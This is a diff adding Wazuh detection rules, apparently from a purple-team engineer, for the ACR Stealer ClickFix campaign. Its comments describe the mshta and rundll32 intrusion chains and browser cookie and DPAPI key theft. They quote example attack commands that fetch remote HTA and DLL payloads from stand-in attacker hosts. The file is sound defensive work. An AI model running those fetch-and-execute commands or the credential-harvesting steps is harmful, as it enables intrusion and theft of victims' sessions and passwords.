@@ -1,0 +1,325 @@
+<!-- ============================================================
+     ACR Stealer Detection Rules
+     Threat: ACR Stealer — ClickFix delivery via WebDAV/MSHTA intrusion chains
+     Source: Microsoft Security Blog / BleepingComputer / The Hacker News, July 2026
+     MITRE ATT&CK Techniques:
+       T1566     - Phishing (ClickFix lure via malvertising/SEO) (TA0001)
+       T1218.005 - Signed Binary Proxy Execution: Mshta (TA0005)
+       T1218.011 - Signed Binary Proxy Execution: Rundll32 (TA0005)
+       T1059.001 - Command and Scripting Interpreter: PowerShell (TA0002)
+       T1555.003 - Credentials from Web Browsers (TA0006)
+       T1528     - Steal Application Access Token (TA0006)
+       T1071.001 - Application Layer Protocol: Web Protocols (TA0011)
+     Rule IDs: 104020-104025
+     Author: SecOps Engineer (Purple Team)
+     Date: 2026-07-19
+
+     Threat Summary:
+
+     ACR Stealer (previously marketed as Amatera Stealer) is an
+     information-stealing malware offered via a malware-as-a-service
+     (MaaS) model. Microsoft observed a surge in ACR Stealer attacks
+     targeting enterprise customers in July 2026. Two distinct
+     intrusion chains were documented, both using ClickFix social
+     engineering as the entry point (malvertising or SEO-poisoned
+     search results presenting a fake CAPTCHA/verification page that
+     instructs the victim to paste a command into Win+R / cmd.exe).
+
+     ACR Stealer primary exfiltration targets:
+       - Browser-stored passwords (Chrome/Edge/Firefox Login Data SQLite)
+       - Browser session cookies (Cookies SQLite database - for T1528)
+       - Chrome/Edge Local State file (contains DPAPI-encrypted AES key
+         used to decrypt all stored browser secrets - key extraction step)
+       - Microsoft 365 files matching Office/PDF extensions on Desktop
+         and in Documents, Downloads, and AppData paths
+       - Cryptocurrency wallet files (MetaMask, Exodus, Ledger Live)
+
+     Intrusion Chain 1: WebDAV DLL Delivery
+       1. ClickFix prompt triggers cmd.exe to run an attacker-supplied command
+       2. cmd.exe invokes rundll32.exe to load a DLL from a remote WebDAV
+          share accessed over HTTPS
+       3. WebDAV paths use GUID-based directory structures and legitimate-
+          looking filenames (e.g., /a1b2c3d4-e5f6.../google.ct) to blend
+          with expected network traffic and evade proxy inspection
+       4. Loaded DLL drops Python-based loader and establishes persistence
+       5. C2 resolution uses blockchain dead-drop (similar to EtherHiding:
+          attacker posts C2 IP into an Ethereum smart contract transaction)
+       6. Browser credential and file exfiltration over HTTPS
+
+     Intrusion Chain 2: MSHTA Fileless Chain
+       1. ClickFix prompt triggers mshta.exe to fetch a remote HTA file
+          via HTTPS from an attacker-controlled domain
+       2. Embedded VBScript in the HTA abuses COM objects (Shell.Application,
+          WScript.Shell) to decode and invoke obfuscated PowerShell
+       3. PowerShell uses steganography: fetches a publicly hosted image
+          (PNG/JPG) and extracts encoded shellcode from pixel least-significant
+          bits; shellcode or .NET assembly is injected and executed in-memory
+       4. No payloads touch disk (fileless execution)
+       5. In-memory stealer accesses browser Cookies and Local State for
+          session token harvest and DPAPI key extraction
+
+     Log source prerequisites:
+       - Sysmon EventID 1 (ProcessCreate) -> Wazuh SID 61603
+         Required for rules 104020, 104021, 104022, 104023, 104024.
+         Sysmon must capture CommandLine and ParentImage fields.
+       - Sysmon EventID 11 (FileCreate) -> Wazuh SID 61644
+         Supplementary for detecting file-copy staging of credential DBs.
+
+     Severity tiers:
+       12 - mshta.exe spawning child interpreter (high-noise, triage signal)
+       13 - mshta.exe executing remote HTA over HTTPS (near-certain malicious)
+       13 - rundll32.exe loading DLL from WebDAV/HTTPS path (near-certain)
+       13 - non-browser process referencing browser Cookies/Local State path
+       14 - browser credential sweep: 3+ access events in 60s (confirmed sweep)
+
+     References:
+       Microsoft Security Blog 2026-07-16:
+         https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
+       BleepingComputer 2026-07:
+         https://www.bleepingcomputer.com/news/security/microsoft-warns-of-surge-in-acr-stealer-attacks-on-customers/
+       The Hacker News 2026-07:
+         https://thehackernews.com/2026/07/acr-stealer-uses-clickfix-lures-to.html
+     ============================================================ -->
+
+<group name="initial_access,defense_evasion,credential_access,acr_stealer,clickfix,windows,">
+
+  <!-- ===========================================================
+       Rule 104020: mshta.exe executing remote HTA over HTTPS
+       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
+       MITRE: T1218.005 (Signed Binary Proxy Execution: Mshta)
+
+       ACR Stealer Campaign 2 (MSHTA Fileless Chain) begins when the
+       ClickFix prompt causes the victim to run a command that spawns
+       mshta.exe with a remote HTTPS URL as its argument. The HTA file
+       is fetched by mshta.exe directly from the attacker's server:
+
+         mshta.exe https://attacker-domain.com/payload.hta
+
+       mshta.exe is a legitimate Windows utility for executing HTML
+       Application files (.hta). In enterprise environments, mshta.exe
+       should never fetch content from arbitrary external HTTP/HTTPS
+       URLs at runtime; legitimate HTA usage references local or UNC
+       paths managed by IT. Any mshta.exe invocation with an HTTP or
+       HTTPS URL argument is a near-certain indicator of abuse.
+
+       The UNC path variant (\\server\share\payload.hta) is also used
+       when the WebDAV mount is pre-staged; this pattern is equally
+       anomalous in enterprise contexts and is caught by the same rule.
+
+       False positives: extremely rare. Some legacy enterprise deployment
+       scripts may reference internal-only http:// paths for HTA delivery
+       over trusted intranet. Tune by checking the target URL hostname
+       against your known-good intranet domains before escalating.
+       =========================================================== -->
+  <rule id="104020" level="13">
+    <if_sid>61603</if_sid>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\mshta\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(https?://|\\\\[^\\]+\\[^\\]+\\.*\.hta)</field>
+    <description>ACR Stealer/ClickFix: mshta.exe fetching remote HTA content [$(win.eventdata.commandLine)] on $(win.eventdata.computer) by $(win.eventdata.user) -- ACR Stealer Campaign 2 uses mshta.exe to fetch attacker-controlled HTA over HTTPS as the initial fileless payload stage; mshta.exe loading remote HTTP/HTTPS URLs is a near-certain indicator of ClickFix/HTA abuse (T1218.005)</description>
+    <mitre>
+      <id>T1218.005</id>
+      <id>T1566</id>
+    </mitre>
+    <group>acr_stealer,clickfix,mshta_remote,defense_evasion,</group>
+  </rule>
+
+  <!-- ===========================================================
+       Rule 104021: rundll32.exe loading DLL from WebDAV/HTTPS path
+       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
+       MITRE: T1218.011 (Signed Binary Proxy Execution: Rundll32)
+
+       ACR Stealer Campaign 1 (WebDAV DLL Delivery) uses rundll32.exe
+       to load a DLL directly from a remote WebDAV share over HTTPS.
+       The ClickFix command causes cmd.exe to invoke:
+
+         rundll32.exe https://webdav.attacker.com/a1b2c3d4-e5f6.../google.ct,DllMain
+
+       Key evasion features:
+         - GUID-based paths mimic legitimate cloud storage or telemetry URLs
+         - Filenames (google.ct, telemetry.dll) mimic trusted software artifacts
+         - WebDAV over HTTPS means the DLL is fetched as a remote file system
+           object rather than a straight HTTP download, bypassing some proxies
+         - rundll32.exe is a trusted Windows binary; DLL is never written to disk
+
+       rundll32.exe loading a DLL from an HTTP/HTTPS URL argument is
+       anomalous in all enterprise contexts. Legitimate uses of rundll32.exe
+       reference local or UNC paths on trusted internal shares, never arbitrary
+       internet-accessible HTTPS URIs or paths containing GUIDs.
+
+       Also catches the variant where WebDAV is mounted first and then
+       accessed via a \\server\share UNC path containing an HTTP-style
+       hostname (distinguishable from LAN file servers by the FQDN).
+
+       False positives: legacy applications that invoke rundll32 with
+       internal intranet UNC paths. Focus on external/internet-routable
+       hostnames in the WebDAV path to reduce noise.
+       =========================================================== -->
+  <rule id="104021" level="13">
+    <if_sid>61603</if_sid>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(https?://.*\.dll|https?://.*,[A-Za-z]+|\\\\[^\\]+\.[a-z]{2,}\\.+,\s*[A-Za-z]+)</field>
+    <description>ACR Stealer/ClickFix: rundll32.exe loading DLL from remote WebDAV/HTTPS path [$(win.eventdata.commandLine)] on $(win.eventdata.computer) by $(win.eventdata.user) -- ACR Stealer Campaign 1 uses rundll32.exe to load a DLL directly from an attacker-controlled WebDAV share over HTTPS, bypassing disk-based AV; rundll32 with HTTPS URL arguments is a confirmed signed-binary proxy execution indicator (T1218.011)</description>
+    <mitre>
+      <id>T1218.011</id>
+      <id>T1566</id>
+    </mitre>
+    <group>acr_stealer,clickfix,rundll32_webdav,defense_evasion,</group>
+  </rule>
+
+  <!-- ===========================================================
+       Rule 104022: mshta.exe spawning child interpreter
+       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
+       MITRE: T1218.005 / T1059.001
+
+       In ACR Stealer Campaign 2, after mshta.exe fetches and executes
+       the remote HTA, the embedded VBScript uses COM objects to spawn
+       further processes. The most common pattern is:
+
+         mshta.exe -> powershell.exe (to execute encoded payload)
+         mshta.exe -> cmd.exe (to stage or run secondary loader)
+         mshta.exe -> wscript.exe / cscript.exe (additional script execution)
+
+       Legitimate mshta.exe usage (enterprise HTA applications, Group
+       Policy distribution) rarely spawns interactive interpreters as
+       child processes. When it does, the parent-child relationship is
+       a strong signal of HTA-based malicious execution.
+
+       This is a triage-level rule (level 12) because some legacy
+       enterprise HTA applications do invoke PowerShell for IT automation.
+       Correlate with rule 104020 (mshta remote fetch) on the same host
+       within the preceding 5-10 minutes to elevate confidence. If both
+       104020 and 104022 fire on the same host, treat as high-confidence
+       ACR Stealer Campaign 2 execution.
+       =========================================================== -->
+  <rule id="104022" level="12">
+    <if_sid>61603</if_sid>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\mshta\.exe$</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)(\\powershell\.exe$|\\pwsh\.exe$|\\cmd\.exe$|\\wscript\.exe$|\\cscript\.exe$|\\regsvr32\.exe$|\\rundll32\.exe$)</field>
+    <description>ACR Stealer/ClickFix: mshta.exe spawned child interpreter $(win.eventdata.image) [$(win.eventdata.commandLine)] on $(win.eventdata.computer) by $(win.eventdata.user) -- ACR Stealer Campaign 2 HTA VBScript uses COM objects to spawn PowerShell or cmd for in-memory payload execution; correlate with rule 104020 (mshta remote fetch) on the same host for high-confidence ACR Stealer confirmation (T1218.005, T1059.001)</description>
+    <mitre>
+      <id>T1218.005</id>
+      <id>T1059.001</id>
+    </mitre>
+    <group>acr_stealer,clickfix,mshta_child_process,defense_evasion,</group>
+  </rule>
+
+  <!-- ===========================================================
+       Rule 104023: Non-browser process referencing browser Cookies database
+       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
+       MITRE: T1528 (Steal Application Access Token) / T1555.003
+
+       ACR Stealer's primary credential harvest target is the browser
+       Cookies SQLite database, which stores session tokens, auth cookies,
+       and application access tokens for cloud services, SaaS platforms,
+       and Microsoft 365. Exfiltrating cookies allows the attacker to
+       impersonate authenticated sessions without needing the victim's
+       password (pass-the-cookie attack).
+
+       The stealer accesses the Cookies database at paths including:
+         C:\Users\*\AppData\Local\Google\Chrome\User Data\<Profile>\Cookies
+         C:\Users\*\AppData\Local\Microsoft\Edge\User Data\<Profile>\Cookies
+         C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite
+         C:\Users\*\AppData\Roaming\Opera Software\Opera Stable\Cookies
+
+       Some ACR Stealer variants stage the file by invoking sqlite3.exe,
+       xcopy, or robocopy with the Cookies path as an argument, or pass
+       the path to a Python/Go subprocess for SQL extraction. This rule
+       catches those patterns by matching the file path in a process
+       commandLine while excluding the browser processes that legitimately
+       own these files.
+
+       False positives: backup agents (Veeam, Acronis) that back up
+       user profiles may reference these paths. Tune by adding known
+       backup agent paths to the negate list. Password managers with
+       import-from-browser features may also trigger this.
+       =========================================================== -->
+  <rule id="104023" level="13">
+    <if_sid>61603</if_sid>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Google\\Chrome\\User Data\\[^\\]+\\Cookies|\\Microsoft\\Edge\\User Data\\[^\\]+\\Cookies|\\Mozilla\\Firefox\\Profiles\\[^\\]+\\cookies\.sqlite|\\BraveSoftware\\Brave-Browser\\User Data\\[^\\]+\\Cookies|\\Opera Software\\Opera[^\\]*\\Cookies)</field>
+    <field name="win.eventdata.image" negate="yes" type="pcre2">(?i)(\\chrome\.exe$|\\msedge\.exe$|\\firefox\.exe$|\\brave\.exe$|\\opera\.exe$|\\chromium\.exe$|\\vivaldi\.exe$|\\torch\.exe$)</field>
+    <description>ACR Stealer: non-browser process $(win.eventdata.image) referencing browser Cookies database path [$(win.eventdata.commandLine)] on $(win.eventdata.computer) -- ACR Stealer targets browser Cookies for session token theft (T1528); non-browser processes accessing Cookie stores are a strong infostealer indicator; correlate with rules 104020-104022 for delivery chain context (T1528, T1555.003)</description>
+    <mitre>
+      <id>T1528</id>
+      <id>T1555.003</id>
+    </mitre>
+    <group>acr_stealer,credential_access,browser_cookie_theft,t1528,</group>
+  </rule>
+
+  <!-- ===========================================================
+       Rule 104024: Non-browser process referencing Chrome/Edge Local State
+       Sysmon Event 1 (ProcessCreate) - Wazuh SID 61603
+       MITRE: T1528 / T1555.003
+
+       Chrome and Microsoft Edge encrypt all stored passwords and cookies
+       using AES-256-GCM. The AES encryption key is itself encrypted with
+       the Windows DPAPI and stored in the "Local State" JSON file at:
+
+         C:\Users\*\AppData\Local\Google\Chrome\User Data\Local State
+         C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Local State
+
+       To decrypt browser passwords and cookies, an infostealer MUST
+       first read the Local State file to extract the "os_crypt.encrypted_key"
+       field, then call CryptUnprotectData() to decrypt the AES key.
+       ACR Stealer (and most modern browser infostealers) implement this
+       two-step DPAPI unwrapping before accessing credential databases.
+
+       Any non-browser, non-updater process passing the Local State path
+       as a commandLine argument (e.g., to python.exe, sqlite3.exe, or
+       a custom Go/Rust/C++ binary) is performing the key extraction step
+       and is a strong ACR Stealer or similar browser infostealer indicator.
+
+       False positives: browser sync/backup tools that export Local State
+       for profile migration; forensic tools (NirSoft, Autopsy) on
+       incident-response workstations. Do not suppress globally; audit
+       each false positive source before adding to noise suppression.
+       =========================================================== -->
+  <rule id="104024" level="13">
+    <if_sid>61603</if_sid>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Google\\Chrome\\User Data\\Local State|\\Microsoft\\Edge\\User Data\\Local State)</field>
+    <field name="win.eventdata.image" negate="yes" type="pcre2">(?i)(\\chrome\.exe$|\\msedge\.exe$|\\GoogleUpdate\.exe$|\\MicrosoftEdgeUpdate\.exe$|\\MicrosoftEdge\.exe$|\\elevation_service\.exe$)</field>
+    <description>ACR Stealer: non-browser process $(win.eventdata.image) accessing browser Local State file [$(win.eventdata.commandLine)] on $(win.eventdata.computer) -- Chrome/Edge Local State contains the DPAPI-encrypted AES key for all stored browser secrets; non-browser access is the DPAPI key extraction step preceding full credential/cookie harvest; high-confidence ACR Stealer or browser infostealer indicator (T1528, T1555.003)</description>
+    <mitre>
+      <id>T1528</id>
+      <id>T1555.003</id>
+    </mitre>
+    <group>acr_stealer,credential_access,dpapi_key_extraction,t1528,</group>
+  </rule>
+
+  <!-- ===========================================================
+       Rule 104025: ACR Stealer browser credential sweep
+       Frequency rule on rule 104023 - Wazuh SID composite
+       MITRE: T1555.003 / T1528
+
+       ACR Stealer targets multiple browser profiles and browser families
+       in a single sweep to maximize credential yield. After obtaining
+       the DPAPI key (104024), the stealer iterates over all browser
+       profile directories in a rapid sequence. Three or more distinct
+       Cookies database access events from the same process on the same
+       host within 60 seconds indicates an active multi-browser credential
+       sweep rather than an isolated false-positive access.
+
+       The frequency threshold (3 events in 60 seconds from same source)
+       distinguishes systematic infostealer enumeration from incidental
+       access. A backup agent that scans user data once per backup job
+       typically runs sequentially across all profiles in well under 60
+       seconds, but it would appear in the same-source window; tune by
+       suppressing known backup process paths in a noise suppression rule.
+
+       This correlation rule fires when 3 or more instances of rule 104023
+       (browser Cookies access) trigger from the same agent within 60
+       seconds. Level 14 (high-confidence active sweep) requires immediate
+       analyst triage. Isolate the affected host and preserve memory for
+       forensic analysis.
+       =========================================================== -->
+  <rule id="104025" level="14" frequency="3" timeframe="60">
+    <if_matched_sid>104023</if_matched_sid>
+    <same_field>win.eventdata.computer</same_field>
+    <description>ACR Stealer: BROWSER CREDENTIAL SWEEP detected on $(win.eventdata.computer) -- 3+ browser Cookies database access events in 60s by $(win.eventdata.image); active multi-browser session token and credential harvest in progress; isolate host immediately and begin forensic triage (T1555.003, T1528)</description>
+    <mitre>
+      <id>T1555.003</id>
+      <id>T1528</id>
+    </mitre>
+    <group>acr_stealer,credential_access,browser_credential_sweep,critical,</group>
+  </rule>
+
+</group>
